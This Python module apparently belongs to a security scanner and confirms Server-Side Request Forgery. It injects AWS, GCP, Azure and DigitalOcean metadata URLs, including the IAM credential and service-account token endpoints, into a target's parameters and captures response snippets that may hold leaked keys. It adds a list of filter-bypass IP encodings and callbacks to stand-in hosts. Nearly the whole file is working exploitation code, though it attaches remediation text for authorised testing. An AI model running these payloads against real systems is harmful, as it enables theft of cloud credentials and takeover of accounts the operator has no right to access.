"""
RedTeef — SSRF confirmation.

DNS callback, cloud metadata endpoint verification, internal service
probing to confirm Server-Side Request Forgery.

CWE-918: Server-Side Request Forgery (SSRF)
"""

from __future__ import annotations

import logging
import re
import secrets
from typing import List, Optional

import httpx

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient, HttpClientMixin

logger = logging.getLogger("krumpa.redteef.ssrf_confirmer")

# Cloud metadata endpoints
_CLOUD_METADATA_URLS = [
    # AWS
    {
        "label": "AWS IMDSv1",
        "url": "http://169.254.169.254/latest/meta-data/",
        "canary": re.compile(r"(ami-id|instance-id|local-hostname|iam)", re.IGNORECASE),
    },
    {
        "label": "AWS IMDSv1 IAM",
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "canary": re.compile(r"(AccessKeyId|SecretAccessKey|Token)", re.IGNORECASE),
    },
    # GCP
    {
        "label": "GCP Metadata",
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "canary": re.compile(r"(instance|project)", re.IGNORECASE),
        "headers": {"Metadata-Flavor": "Google"},
    },
    {
        "label": "GCP Service Account",
        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "canary": re.compile(r"(access_token|token_type)", re.IGNORECASE),
        "headers": {"Metadata-Flavor": "Google"},
    },
    # Azure
    {
        "label": "Azure IMDS",
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "canary": re.compile(r"(compute|network|vmId)", re.IGNORECASE),
        "headers": {"Metadata": "true"},
    },
    # DigitalOcean
    {
        "label": "DigitalOcean Metadata",
        "url": "http://169.254.169.254/metadata/v1/",
        "canary": re.compile(r"(droplet_id|hostname|region)", re.IGNORECASE),
    },
    # Common internal endpoints
    {
        "label": "Localhost probe",
        "url": "http://127.0.0.1/",
        "canary": re.compile(r"(<html|<body|<!DOCTYPE|welcome|dashboard)", re.IGNORECASE),
    },
    {
        "label": "Internal services",
        "url": "http://localhost:8080/",
        "canary": re.compile(r"(<html|<body|api|health|status)", re.IGNORECASE),
    },
]

# Bypass techniques for SSRF filters
_BYPASS_VARIANTS = [
    # IP representations
    {"label": "Decimal IP", "transform": lambda url: url.replace("169.254.169.254", "2852039166")},
    {"label": "Hex IP", "transform": lambda url: url.replace("169.254.169.254", "0xA9FEA9FE")},
    {"label": "Octal IP", "transform": lambda url: url.replace("169.254.169.254", "0251.0376.0251.0376")},
    {"label": "IPv6 mapped", "transform": lambda url: url.replace("127.0.0.1", "[::ffff:127.0.0.1]")},
    {"label": "Short IPv6", "transform": lambda url: url.replace("127.0.0.1", "[::1]")},

    # URL tricks
    {"label": "URL-encoded", "transform": lambda url: url.replace("169.254.169.254", "169.254.169.254%00")},
    {"label": "Double-encoded", "transform": lambda url: url.replace("http://", "http%3A%2F%2F")},
    {"label": "Domain redirect", "transform": lambda _: "http://spoofed.burpcollaborator.net/"},
]


class SsrfConfirmer(HttpClientMixin):
    """
    Confirm SSRF by:
      1. Probing cloud metadata endpoints (AWS/GCP/Azure/DO)
      2. DNS callback verification
      3. Internal service detection
      4. IP representation bypass variants
    """

    def __init__(
        self,
        *,
        http_client: Optional[HttpClient] = None,
        callback_base_url: str = "https://ssrf.krumpa.example.com",
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None
        self._callback_base = callback_base_url

    async def confirm(
        self,
        target: Target,
        inject_field: str = "",
    ) -> List[Finding]:
        """
        Attempt to confirm SSRF on the target.

        Args:
            target: The target endpoint.
            inject_field: The parameter name to inject URLs into.

        Returns:
            List of confirmed findings.
        """
        findings: List[Finding] = []
        client = self._client or HttpClient(timeout=10.0, retries=0)

        try:
            # --- 1. Cloud metadata probing ---
            metadata_findings = await self._probe_cloud_metadata(
                client, target, inject_field,
            )
            findings.extend(metadata_findings)

            # --- 2. DNS callback ---
            dns_finding = await self._test_dns_callback(
                client, target, inject_field,
            )
            if dns_finding:
                findings.append(dns_finding)

            # --- 3. Bypass variants (only if no findings yet) ---
            if not findings:
                bypass_findings = await self._test_bypass_variants(
                    client, target, inject_field,
                )
                findings.extend(bypass_findings)

        finally:
            if self._owns_client and client is not self._client:
                await client.close()

        return findings

    async def _probe_cloud_metadata(
        self,
        client: HttpClient,
        target: Target,
        inject_field: str,
    ) -> List[Finding]:
        """Inject cloud metadata URLs and check for canary patterns."""
        findings: List[Finding] = []
        field_name = inject_field or "url"

        for meta in _CLOUD_METADATA_URLS:
            try:
                method = target.method.upper() if target.method else "GET"
                if method == "GET":
                    params = {field_name: meta["url"]}
                    resp = await client.request("GET", target.url, params=params)
                else:
                    body = {field_name: meta["url"]}
                    resp = await client.request(method, target.url, json_body=body)

                if resp.status_code in (200, 201) and meta["canary"].search(resp.text):
                    is_credential = bool(
                        re.search(r"(AccessKeyId|SecretAccessKey|access_token|Token)", resp.text)
                    )
                    severity = Severity.CRITICAL if is_credential else Severity.HIGH

                    findings.append(Finding(
                        title=f"[CONFIRMED] SSRF — {meta['label']} on {target.url}",
                        description=(
                            f"SSRF confirmed: injecting {meta['label']} URL via "
                            f"'{field_name}' returned cloud metadata content. "
                            + ("Cloud credentials were exposed! " if is_credential else "")
                            + "This allows an attacker to access cloud instance "
                            "metadata, potentially leading to credential theft "
                            "and full cloud account compromise."
                        ),
                        severity=severity,
                        target=target,
                        evidence=(
                            f"Metadata URL: {meta['url']}\n"
                            f"Field: {field_name}\n"
                            f"Label: {meta['label']}\n"
                            f"Status: {resp.status_code}\n"
                            f"Response snippet: {resp.text[:300]}"
                        ),
                        remediation=(
                            "Block requests to metadata endpoints (169.254.169.254, etc.). "
                            "Use IMDSv2 (token-required) on AWS. Implement allowlist-based "
                            "URL validation. Use a dedicated HTTP client without internal "
                            "network access for user-supplied URLs."
                        ),
                        cwe=918,
                        tags=["confirmed", "ssrf", "cloud-metadata", "redteef"],
                    ))
                    return findings  # Critical finding, stop here
            except (httpx.HTTPError, OSError, ValueError):
                continue

        return findings

    async def _test_dns_callback(
        self,
        client: HttpClient,
        target: Target,
        inject_field: str,
    ) -> Optional[Finding]:
        """Inject a DNS callback URL to detect out-of-band SSRF."""
        field_name = inject_field or "url"
        canary_id = secrets.token_hex(8)
        callback_url = f"{self._callback_base}/{canary_id}"

        try:
            method = target.method.upper() if target.method else "GET"
            if method == "GET":
                params = {field_name: callback_url}
                resp = await client.request("GET", target.url, params=params)
            else:
                body = {field_name: callback_url}
                resp = await client.request(method, target.url, json_body=body)

            # Even if we don't get a callback (would need OOB infrastructure),
            # a successful request with the callback URL accepted is informational
            if resp.status_code in (200, 201, 202):
                return Finding(
                    title=f"SSRF callback URL accepted on {target.url}",
                    description=(
                        f"The server accepted a callback URL ({callback_url}) via "
                        f"'{field_name}'. If OOB monitoring infrastructure detects "
                        f"a callback, this confirms SSRF. Even without callback "
                        f"confirmation, URL acceptance suggests the server makes "
                        f"outbound requests with user-supplied URLs."
                    ),
                    severity=Severity.MEDIUM,
                    target=target,
                    evidence=(
                        f"Callback URL: {callback_url}\n"
                        f"Canary ID: {canary_id}\n"
                        f"Field: {field_name}\n"
                        f"Status: {resp.status_code}"
                    ),
                    remediation=(
                        "Validate and allowlist outbound URLs. Block requests to "
                        "internal networks (RFC 1918, link-local). Use DNS pinning "
                        "to prevent DNS rebinding attacks."
                    ),
                    cwe=918,
                    tags=["ssrf", "dns-callback", "redteef"],
                )
        except (httpx.HTTPError, OSError, ValueError):
            pass

        return None

    async def _test_bypass_variants(
        self,
        client: HttpClient,
        target: Target,
        inject_field: str,
    ) -> List[Finding]:
        """Try SSRF bypass variants (IP encoding, etc.)."""
        findings: List[Finding] = []
        field_name = inject_field or "url"

        # Use the AWS metadata URL as base for bypass testing
        base_url = "http://169.254.169.254/latest/meta-data/"
        canary = re.compile(r"(ami-id|instance-id|local-hostname)", re.IGNORECASE)

        for variant in _BYPASS_VARIANTS:
            try:
                bypass_url = variant["transform"](base_url)
                method = target.method.upper() if target.method else "GET"
                if method == "GET":
                    params = {field_name: bypass_url}
                    resp = await client.request("GET", target.url, params=params)
                else:
                    body = {field_name: bypass_url}
                    resp = await client.request(method, target.url, json_body=body)

                if resp.status_code in (200, 201) and canary.search(resp.text):
                    findings.append(Finding(
                        title=f"[CONFIRMED] SSRF bypass via {variant['label']} on {target.url}",
                        description=(
                            f"SSRF filter bypass confirmed using {variant['label']}. "
                            f"The server allows access to cloud metadata after "
                            f"applying IP encoding tricks to evade the SSRF filter."
                        ),
                        severity=Severity.CRITICAL,
                        target=target,
                        evidence=(
                            f"Bypass: {variant['label']}\n"
                            f"URL: {bypass_url}\n"
                            f"Field: {field_name}\n"
                            f"Status: {resp.status_code}\n"
                            f"Response snippet: {resp.text[:300]}"
                        ),
                        remediation=(
                            "Use a robust SSRF filter that handles all IP "
                            "representations (decimal, hex, octal, IPv6). "
                            "Parse and resolve URLs before validation. "
                            "Block private/link-local ranges at network level."
                        ),
                        cwe=918,
                        tags=["confirmed", "ssrf", "bypass", "redteef"],
                    ))
                    return findings
            except (httpx.HTTPError, OSError, ValueError):
                continue

        return findings
